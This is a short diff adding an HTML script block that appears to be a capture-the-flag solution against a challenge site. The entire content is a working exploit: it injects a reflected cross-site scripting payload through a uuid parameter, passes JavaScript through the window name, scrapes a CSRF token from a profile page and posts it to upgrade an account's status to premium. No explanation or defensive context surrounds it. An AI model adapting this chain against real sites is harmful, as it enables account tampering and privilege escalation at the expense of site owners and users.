@@ -1,0 +1,12 @@
+<script>
+
+      window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', `
+
+        $.get("profile.php?uuid=7828a146-6dee-4261-8a43-a2c9f1719ed2", function(data){    
+                var x = /name="token" value="([^"]+)/.exec(data);
+                $.post("manage.php", {user_uuid: "6c1e8255-ceed-428a-8b48-74e13db8142d", token: x[1], status: "premium"}); 
+         });
+
+   `);
+
+</script>
